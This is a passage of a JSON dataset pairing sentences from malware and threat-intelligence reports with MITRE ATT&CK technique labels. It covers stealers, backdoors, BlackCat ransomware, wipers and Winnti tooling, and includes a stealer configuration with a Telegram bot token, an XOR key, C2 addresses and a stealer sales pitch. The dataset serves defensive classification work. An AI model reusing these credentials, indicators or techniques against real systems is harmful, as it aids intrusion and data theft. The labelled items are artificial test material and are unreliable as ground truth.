    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution, the malware creates the mutex to mark its presence on the system and retrieves the MachineGuid of the infected system from the \"SOFTWARE\\Microsoft\\Cryptography\\MachineGuid\" registry key. ",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Constructing a unique system identifier and creating a mutex Next, the malware will determine if it is running as an account with administrator privileges or simply as a regular user using the GetTokenInformation API.",
    "command": "",
    "labels": [
      "T1033",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The malware then establishes persistence on the targeted system by creating scheduled tasks. Figure 28.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Upon receiving the runassembly command, the malware downloads the next part of the final stage payload (file_19.pack), decompresses it using the GZipStream API, and executes it. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution, the malware initializes configuration and sets up its working directory. Figure 37.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Engima Stealer initialization The malware configuration is as follows: public static string Version = \"0.05.01\"; public static string DebugMode = \"0\"; public static string Mutex = \"6C0560CE-2E75-4BB4-A26E-F08592A1D56D\"; public static string AntiAnalysis = \"0\"; public static string Autorun = \"1\"; public static string StartDelay = \"0\"; public static string WebcamScreenshot = \"1\"; public static string KeyloggerModule = \"0\"; public static string ClipperModule = \"0\"; public static string GrabberModule = \"0\"; public static string TelegramToken = \"5894962737:AAHAFZnz2AkLAyHC0G-7S2je9JMWWLJHGsU\"; public static string TelegramChatID = \"5661436914\"; It then starts to collect system information and steals user information, tokens, and passwords from various web browsers and applications such as Google Chrome, Microsoft Edge, Microsoft Outlook, Telegram, Signal, OpenVPN and others.",
    "command": "",
    "labels": [
      "T1074.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This new backdoor gathers basic system information, which it then sends to the C2, and in return receives an AES encrypted payload. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Dave Loader loads the resources using the API calls LdrFindResource_U and LdrAccessResource, and decrypts them using XOR and the key mh8ZqMlTsaDYBZe7ma\\x00. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Dave Loader executes the decrypted shellcode and passes the PE payload to it, which the shellcode then loads and executes. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution, Domino Backdoor starts by generating a Bot ID for the infected system by gathering the username and hostname and creating a hash of the collected data, to which it then appends its current process id.",
    "command": "",
    "labels": [
      "T1005",
      "T1033",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "If the initial connection is successful, the malware then proceeds to gather basic system information, including username, computer name, and OS version, which it then encrypts using AES-256-CBC and the generated, shared key (null bytes used for IV). ",
    "command": "",
    "labels": [
      "T1033",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "If the command byte is 0x7, then the malware enumerates the running processes on the system and compiles a list of process names and IDs.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "0x1 — Copy the payload into allocated memory within the current process and create a new thread to execute an export named ReflectiveLoader within the payload DLL. 0x4 — Save the payload to the %Temp% directory with a filename generated via GetTempFileNameA, and execute the file using CreateProcessA. 0x5, 0x6 — Open process with process id provided with the downloaded data.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "In addition to having similar coding styles and utilising similar API calls, Domino Backdoor uses the same configuration structure as the Lizar Loader.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "In the case of Domino Backdoor a hash is generated from the system username and hostname and the process ID is appended.",
    "command": "",
    "labels": [
      "T1033",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Also, the function within Domino Backdoor to enumerate running processes and send a list of process names and IDs back to the C2 is very similar to the functionality of Lizar’s ListProcesses32/ListProcesses64.dll plugin. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "If the value of the load field is -1 then the loader allocates memory within the current process and then loads the PE payload into it using the full PE loading procedure.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "It copies the headers, maps the individual PE sections, processes any relocations, loads the PE’s imports, and then executes the PE from its internally specified entry point. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "– Selling together with all sources (build, builder, panel) FUNCTIONALITY : Spoiler: STEALER – Log collection takes place in memory – Collection of data from Chromium browsers (Cookies/CC/Passwords/Autofills/Bookmars/History) v80+ – Collection of data from Gecko browsers (Cookies/Passwords/Bookmark/History) v80+ – Collection of RDP/FTP sessions – Grabbink files from the desktop (by extension) – Collection of UserAgent – Collection of information about the system in HTML format – Collect Vpn (NordVpn/OpenVpn/ProtonVpn) –",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Electrum,Electrum-Dash,Ethereum,Exodus,Atomic,Jaxx,Coinomi,Guarda,Armory,Zcash,Bytecoin List of supported crypto plugins: TronLink, MetaMask, Binance Chain Wallet Anti-sniffer: All programs that catch http/https data transfer are closed [even if the name is changed] – Self-delete after sending data (on/off) – CIS(Lock start in CIS countries) (on/off) – Blocking startup on virtual machines (on/off) – Sending data to the Web-panel (IP logger is on the side of the panel) ",
    "command": "",
    "labels": [
      "T1070.004",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Browsers include: “\\\\Mozilla\\\\Firefox”, “\\\\Comodo\\\\IceDragon”, “\\\\Mozilla\\\\SeaMonkey”, “\\\\Moonchild Productions\\\\Pale Moon”, “\\\\Waterfox”, “\\\\K-Meleon”, “\\\\Thunderbird”, “\\\\8pecxstudios\\\\Cyberfox”, “\\\\NETGATE Technologies\\\\BlackHaw” CryptoWallet data from browser extensions MetaMask, TronLink, and Binance Clipboard data The following data collection tasks are then all set to run in parallel. CryptoWallets on disk from apps including: Electrum, Electrum-Dash, Ethereum, Exodus, Atomic, Jaxx, Coinomi, Guarda, Armory, Zcash, Bytecoin System info, including both hardware and OS info. ",
    "command": "",
    "labels": [
      "T1057",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Enumerates running processes Enumerates IDs from Steam application Enumerates files under Steam application directory Gets a list of installed browsers by looping through entries under registry key SOFTWARE\\\\Clients\\\\StartMenuInternet and SOFTWARE\\\\WOW6432Node\\\\Clients\\\\StartMenuInternet, and then recording the contents of subkey shell\\\\open\\\\command for each. ",
    "command": "",
    "labels": [
      "T1012",
      "T1057",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Enumerate files on desktop Discord Tokens FoxMail data DynDNS credentials FileZilla connection credentials + hosts. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Fig 7 — Nemesis waits for data collection tasks to complete, then adds the data to a zip archive to be sent to the C2 Fig 8 — Nemesis uploads data to the C2 via a HTTP POST request The C2 address for the analysed sample is https[:]//es-megadom[.]com Fig 9 — Nemesis Configuration A Tangled Web Provides Opportunities This analysis highlights the intricate relationships between cybercriminal groups and their members.",
    "command": "",
    "labels": [
      "T1005",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "PowerShell;The attackers may use PowerShell scripts when deploying ransomware in the victim’s network, disabling security tools, and encrypting files. ;T1059.003",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Windows Command Shell;For stopping IIS, deleting Volume Shadow Copies, disabling recovery, clearing Windows event logs, etc., the BlackCat ransomware uses the command shell to run appropriate commands. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Instrumentation;The attackers may use wmic to obtain information and run various commands, including to delete Volume Shadow Copies.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "They may also use the wmiexec module from Impacket to execute commands and move across the network. ;T1569.002 System Services: Service Execution;The BlackCat ranswomare for Windows can self-propagate in the local area network using the legitimate PsExec utility (contained in its body), which creates a temporary system service. ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "TA0003 Persistence;T1505 Server Software Component;Successfully exploiting ProxyShell vulnerabilities enabled the attackers to place a web shell on a vulnerable Microsoft Exchange server. ;T1078 Valid Accounts;Legitimate accounts obtained by the attackers can be used to ensure persistence in the compromised infrastructure. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "TA0004 Privilege Escalation;T1078 Valid Accounts;To escalate privileges, BlackCat may use stolen legitimate accounts specified in the configuration data. ;T1548.002 Abuse Elevation Control Mechanism: Bypass User Account Control;To bypass UAC, BlackCat ransomware may escalate privileges using the ICMLuaUtil COM interface, as well as use the Masquerade PEB method. ;T1134.002 Access Token Manipulation: Create Process with Token;To escalate privileges, the BlackCat ransomware can launch its process using stolen authentication data and the function CreateProcessWithLogonW. TA0005 Defense Evasion;T1548.002 Abuse Elevation Control Mechanism: Bypass User Account Control;The attackers may bypass UAC using the ICMLuaUtil COM interface, as well as use the Masquerade PEB method. ;T1140 Deobfuscate/Decode Files or Information;BlackCat decrypts configuration data as well as decrypts and unpacks the legitimate PsExec utility and an additional BAT file contained in the body of the ransomware. ;T1027 Obfuscated Files or Information;BlackCat ransomware uses obfuscation. ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1078",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": ";T1562.001 Impair Defenses: Disable or Modify Tools;To prevent being detected, the attackers end processes and services related to security and antivirus software. ;T1497 Virtualization/Sandbox Evasion;To counter analysis (including in a sandbox), ALPHV MORPH checks the value of the command line parameter access-token.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "T1036 Masquerading;The attackers use a SoftPerfect Network Scanner executable renamed to svchost.exe. ;T1112 Modify Registry;To propagate, BlackCat uses PsExec to modify the system registry parameter MaxMpxCt to increase the number of failed network requests for each client. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "TA0006 Credential Access;T1003.001 OS Credential Dumping: LSASS Memory;To obtain authentication data, the attackers may dump the LSASS process using legitimate tools (procdump, comsvcs.dll). ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": ";T1087.002 Account Discovery: Domain Account; ;T1482 Domain Trust Discovery;To obtain information about domain trust, the attackers used the ADRecon tool. ;T1046 Network Service Scanning;To scan the target network, the attackers use the open-source utility SoftPerfect Network Scanner. ;T1135 Network Share Discovery;To search for network shares, the attackers use the open-source utility SoftPerfect Network Scanner. ;T1016 System Network Configuration Discovery;For network reconnaissance, the attackers use the open-source utility SoftPerfect Network Scanner. ;T1082 System Information Discovery;BlackCat uses wmic to obtain the UUID of the compromised host. ",
    "command": "",
    "labels": [
      "T1047",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": ";T1057 Process Discovery;BlackMatter enumerates all running processes to search for ones relating to security, backups, databases, email systems, office programs, etc. ;T1007 System Service Discovery;BlackCat enumerates system services to search for ones relating to security, backups, and databases. ;T1083 File and Directory Discovery;The attackers enumerate drives, directories, and files to search for sensitive information for exfiltration purposes. ",
    "command": "",
    "labels": [
      "T1005",
      "T1057",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Remote Desktop Protocol;The attackers may use RDP to move across the network. ;T1021.002 Remote Services: SMB/Windows Admin Shares;After obtaining privileged authentication data, in order to spread over the local area network and access network resources, the attackers may use the PsExec utility, as well as the psexec, wmiexec and smbexec modules from Impacket. ;T1021.004 Remote Services: SSH;To access parts of the infrastructure running on Linux, the attackers use the PuTTY utility. ;T1570 Lateral Tool Transfer;Moving across the victim’s network and deploying ransomware involves copying related tools to the host.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "TA0009 Collection;T1560.001 Archive Collected Data: Archive via Utility;Before being exfiltrated, data may be put in archives using 7-Zip. ;T1005 Data from Local System;The attackers collect information from the local system for exfiltration purposes. ;T1039",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Data from Network Shared Drive;The attackers collect information from available network resources for exfiltration purposes. ;T1074 Data Staged;Before exfiltration, the attackers may put collected data in 7Zip archives. ;T1119 Automated collection;The attackers use ExMatter, a tool for automated collection of sensitive information. ",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "TA0011 Command and Control;T1071 Application Layer Protocol;Remote access tools used by the attackers may use application layer protocols (HTTP, HTTPS, DNS). ;T1105",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Ingress Tool Transfer;After gaining initial access, the attackers copy tools necessary for deployment to the compromised host. ;",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "For this reason, in addition to destroying the data, many wipers first destroy two special files in the system: The Master Boot Record (MBR), which is used during the boot process to identify where the Operative System is stored in the disk.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Finally, the malware executes a command to delete itself from the system (T1070.004). ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The attackers have been seen using several methods to distribute the wiper through the domain, like: domain Group Policy Object (GPO) (T1484.001), Impacket or SMB (T1021.002) and WMI (T1047) with an additional worm component named HermeticWizard. ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The wiper component first installs the payload as a service (T1569.002) under C:\\Windows\\system32\\Drivers\\. Afterwards, the service corrupts the first 512 bytes of the MBR of all the Physical Drives, and then enumerates their partitions.",
    "command": "",
    "labels": [
      "T1083",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Before attempting to overwrite as much data as the wiper can it will delete key files in the partition, like MFT, $Bitmap, $LogFile, the NTUSER registry hive (T1112) and the event logs (T1070.001). ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The wiper’s routine sets a hardcoded list of system directories, which are skipped during an initial wiping targeting user files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Afterwards, the skipped system directories are targeted and finally the registry hives: HKEY_LOCAL_MACHINE (containing the hives Sam, Security, Software and System), HKEY_CURRENT_USER and HKEY_USERS. ",
    "command": "",
    "labels": [
      "T1012",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Contents Higaisa shortcuts Attribution Crosswalk Loaders and injectors Injectors Local shellcode loaders Attack examples An encrypted resume I can't breathe Chat transcript Attacks on Russian game developers Unity3D Game Developer from St. Petersburg HFS with a surprise A purloined certificate FunnySwitch Unpacking Funny.dll Transport protocols Network-level protocol Application-level protocol Supported commands Unused code FunnySwitch vs. Crosswalk ShadowPad PlugX Paranoid PlugX Conclusion PT products detection names PT Sandbox PT Network Attack Discovery Applications Known names of files from which PL shellcode may be loaded IOCs MITRE 1.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Comparing command lines in the covid-19 and Zeplin shortcutsThe mechanism for initial infection is fundamentally the same: trying to open either of the shortcuts leads to running a command that extracts a Base64-encoded CAB archive from the body of the LNK file, after which the archive is unpacked to a temporary folder.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Contents of script 34fDFkfSD32.jsBut here is where the similarity with the sample described in our Higaisa report ends: instead, this script copies the payload to the folder C:\\Users\\Public\\Downloads, achieves persistence by adding itself to the startup folder and adding a scheduler task, and runs the payload.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The script also sends the output of ipconfig in a POST request to http://zeplin.atwebpages[.]com/inter.php. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The command run by the shortcut also contains the opening of a URL file extracted from the archive.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Depending on which shortcut was opened, the output of ipconfig was sent to one of two addresses: http://goodhk.azurewebsites[.]net/inter.php or http://sixindent.epizy[.]com/inter.php. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The main component connects to a C2 server, collects and sends system information, and contains functionality for installing and running up to 20 additional modules received from the server as shellcode. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "The information collected by the module includes: OS uptime Network adapter IP addresses MAC address of one of the adapters Operating system version and whether it is 32-bit or 64-bit Username Computer name Name of running module PID Shellcode version and whether it is 32-bit or 64-bit (The shellcode supports both 32 and 64 bits.)",
    "command": "",
    "labels": [
      "T1016",
      "T1033",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The communication protocol used between the backdoor and C2 server can be separated logically into two levels: Application-level protocol Transport-level protocol On the application level, messages consist of the following fields: FakeTLS header consisting of 5 bytes: Entry type and protocol version (3 bytes).",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "During the first connection, a GET request is sent to the C2 server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The subsequent stream of application-level messages from the server to the client is sent as the body of an HTTP response. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "After receipt of a response with code 200, subsequent messages from the client to the server are sent using separate POST requests. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Second HTTP connection with C2 Duplication of socket with TLS connection The client establishes a TCP connection and sends an HTTPS request like the following one: GET /msdn.cpp HTTP/1.1 Connection: Keep-Alive User-Agent: WinHTTP/1.1 Content-Length: 4294967295 Host:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "We can categorize these objects into two groups: local shellcode loaders and injectors.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Code for injecting shellcode into a running processThe injectors contain typical code that obtains SeDebugPrivilege, finds the PID of the target process, and injects shellcode into it.",
    "command": "",
    "labels": [
      "T1055",
      "T1057",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "2.2 Local shellcode loaders The main function of the malware is to extract shellcode and run it in an active process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Code of the loader's main functionAfter the malware finds the API functions it needs, it decrypts the string Global\\0EluZTRM3Kye4Hv65IGfoaX9sSP7VA with the ChaCha20 algorithm.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Handling of PL shellcode in the loader body (ChaCha20)The ChaCha20 implementation is not always present: some of the samples use Microsoft CryptoAPI with AES-128-CBC for encryption.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Handling of PL shellcode in the loader body (AES-128)Older loader versions use Cryptography API:",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Configuration of Cobalt Strike BeaconThe archive was distributed on approximately June 1, 2020, from the IP address 66.42.48[.]186 and was available at hxxp://66.42.48[.]186:65500/electronic_resume.pdf.rar.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The same IP address was used as C2 server. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Reference to pass.js in HTML codeThe script uses a technique for running an arbitrary command in a CHM file via an ActiveX object.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Current processes are checked and the malware will not run if any of the following are active: ollydbg.exe|ProcessHacker.exe|Fiddler.exe|windbg.exe|tcpview.exe|idaq.exe|idaq64.exe|tcpdump.exe|Wireshark.exe. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "If the user opens it directly, a message warns that the document is password-protected. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "resume.exe: actions on first launchThe payload runs in a new process %windir%\\System32\\spoolsv.exe, into which the main shellcode is injected: Cobalt Strike Beacon with C2 address 149.28.84[.]98. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Injection occurs by creating a section via a ZwCreateSection call, getting access to it from the parent and child processes via ZwMapViewOfSection calls, copying shellcode to the section, and placing a jump to the shellcode at the entry point for spoolsv.exe. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "To ensure autostart, auxiliary shellcode writes the file svchost.bat, which transfers control to winness.exe, to the startup folder.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "For avoiding detection at this stage, the auxiliary shellcode is injected in a similar way into spoolsv.exe, independently loads the necessary functions, and writes to file in a separate thread. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "When winness.exe runs after a restart, the main shellcode is decrypted from winness.config and injected into spoolsv.exe in exactly the same way. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Copy of the official Battlestate Games siteWhen used as C2 servers, such domains give attackers the ability to mask malicious traffic as legitimate activity within the company. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "They include Crosswalk and Metasploit injectors, the juicy-potato utility, and samples of FunnySwitch and ShadowPad. 5.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The files n3.exe and p3.exe are identical and inject shellcode into the process explorer.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The job of the shellcode is to launch and execute a method from the .NET assembly located immediately after its code.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "assemblyThe assembly is the library Funny.dll with obfuscation by ConfuserEx. 5.2 Funny.dll The backdoor starts by parsing the configuration.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "TcpConnector also has the parameter interval, which indicates how long to wait before trying to reconnect. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "HttpConnector and HttpBindConnector are HTTP client with support for proxy and HTTP server. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The standard classes HttpWebRequest and HttpListener from .NET",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Framework are used for client and server implementations.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Both HTTP and HTTPS are supported: if no SSL certificate is configured for the port on which the server is running, it will be launched with CN = Environment.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The client, in turn, ignores certificate validation. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "RPCConnector and RPCBindConnector are classes that allow setting up a connection via a Named Pipe.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "They take a single parameter, name, which is the name of the connection. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "TcpBindConnector and HttpBindConnector support simultaneous connections for multiple clients. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The first two monitor the connection and are relevant only at the TcpConnector/TcpBindConnector level.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Standard encryption in FunnySwitch HTTP with long polling There are three types of requests: GET \"connect\", GET \"pull\", and POST \"push\".",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "To start transferring data, the client must connect by sending a GET request to a URL from the configuration and provide a special cookie value. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The client then constantly sends GET requests with pull operations.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Client–server messages are periodically sent as an array as well, for which a POST request with push operation is used. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The backdoor collects the following system information: Values of the registry keys ProductName and CSDVersion from HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion Whether the OS is 32-bit or 64-bit List of IP addresses Computer name Username and workgroup Name of running module PID MAC addresses of network adapters Value of the Group attribute in the XML configuration 5.2.3 Application-level protocol At the application level, data is encrypted in the standard way using the value of the Password attribute from the configuration.",
    "command": "",
    "labels": [
      "T1016",
      "T1033",
      "T1057",
      "T1071.001",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "query Collects the configuration of active connector instances other than the RPCConnector and RPCBindConnector classes. ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "It dynamically loads the library log.dll. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "After decryption, the file is deleted and the shellcode is re-encrypted, saved in the registry, and run.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Its core is typical of PlugX, being an SFX archive (ccdb8e0162796efe19128c0bac78478fd1ff2dc3382aed0c19b0f4bd99a31efc) that contains the library mapistub.dll, which loads as a legitimate executable. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Contents of the SFX archiveWhen unpacked, the archive runs the script 1.vbs, which in turn passes control to a.bat. Figure 60.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Running shellcode in image.jpgThe purpose of image.jpg is to run the same PlugX shellcode with the help of CreateThread. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The domain upgradsource[.]com is mentioned in a Unit42 report on a group of similar samples named \"Paranoid PlugX.\" They received this name due to the presence of a script for wiping traces of malware from the system.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Among other reasons, the structure of the .NET Wrapper module in image.jpg, and much of the cleanup script a.bat, is nearly identical. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Spearphishing Link Winnti sends phishing messages with malicious links Execution T1059.003 Command and Scripting Interpreter: Windows Command Shell Winnti uses cmd.exe and .bat files to run commands T1059.005 Command and Scripting Interpreter: Visual Basic Winnti uses VBS files to pass control to subsequent malware stages T1059.007 Command and Scripting Interpreter: JavaScript/JScript Winnti uses malicious JScript code in intermediate stages and for the payload T1203 Exploitation for Client Execution Winnti exploits RCE in a CHM file by means of an ActiveX object T1106 Native API Winnti uses various WinAPI functions to run malicious shellcode in the current process or to inject it into another process T1204.002 User Execution: Malicious File Winnti tries to make users run malicious .lnk, .chm, and .exe files Persistence T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Winnti persists by means of a registry run key or a startup folder T1543.003 Create or Modify System Process:",
    "command": "",
    "labels": [
      "T1059.003",
      "T1106",
      "T1204.002",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Windows Service Winnti persists on infected machines by creating new services T1053.005 Scheduled Task/Job: Scheduled Task Winnti creates a task with schtasks for persistence Defense evasion T1140 Deobfuscate/Decode Files or Information To store shellcode with the payload, Winnti uses a custom PL format with encryption T1574.002 Hijack Execution Flow: DLL Side-Loading Winnti uses legitimate utilities to load DLLs from ShadowPad and PlugX T1562.004 Impair Defenses: Disable or Modify System Firewall FunnySwitch adds allow rules to Windows Firewall for C2 connections T1070 Indicator Removal on Host Paranoid PlugX deletes artifacts created during infection from the file system and registry T1202 Indirect Command Execution Winnti uses intermediate VBS scripts to run .bat",
    "command": "",
    "labels": [
      "T1053.005",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "files T1027.002 Obfuscated Files or Information: Software Packing Winnti can use VMProtect or custom packers for its malware T1055.002 Process Injection: Portable Executable Injection Winnti injects shellcode into the processes explorer.exe, winlogon.exe, wmplayer.exe, svchost.exe, and spoolsv.exe T1218.001 Signed Binary Proxy Execution: Compiled HTML File Winnti uses CHM files containing malicious code T1218.004 Signed Binary Proxy Execution: InstallUtil Paranoid PlugX can use InstallUtil to run a malicious .NET assembly T1553.002 Subvert Trust Controls: Code Signing Winnti uses stolen certificates to sign its malware Discovery T1082 System Information Discovery Winnti backdoors collect information about the computer name and OS version and whether it is 32-bit or 64-bit T1016 System Network Configuration Discovery Winnti backdoors collect information about the IP and MAC addresses of the infected machine T1033 System Owner/User Discovery Winnti backdoors collect information about the name of the current user Collection T1119 Automated Collection Winnti backdoors automatically collect information about the infected machine Command and Control T1071.001 Application Layer Protocol: Web Protocols Winnti backdoors can use HTTP/HTTPS for C2 connections T1132.001 Data Encoding: Standard Encoding Winnti uses GZip for compressing FunnySwitch data T1001.003 Data Obfuscation:",
    "command": "",
    "labels": [
      "T1016",
      "T1033",
      "T1055",
      "T1071.001",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "We will highlight a few in each category. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Besides the use of Mimikatz to dump credentials, the adversaries used two tools for privilege escalations [T1068].",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The DLL loads the PlugX config and injects it into a process. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "After the basic forensically sound steps, we ran the malfind plugin to detect possible injected code in a process.",
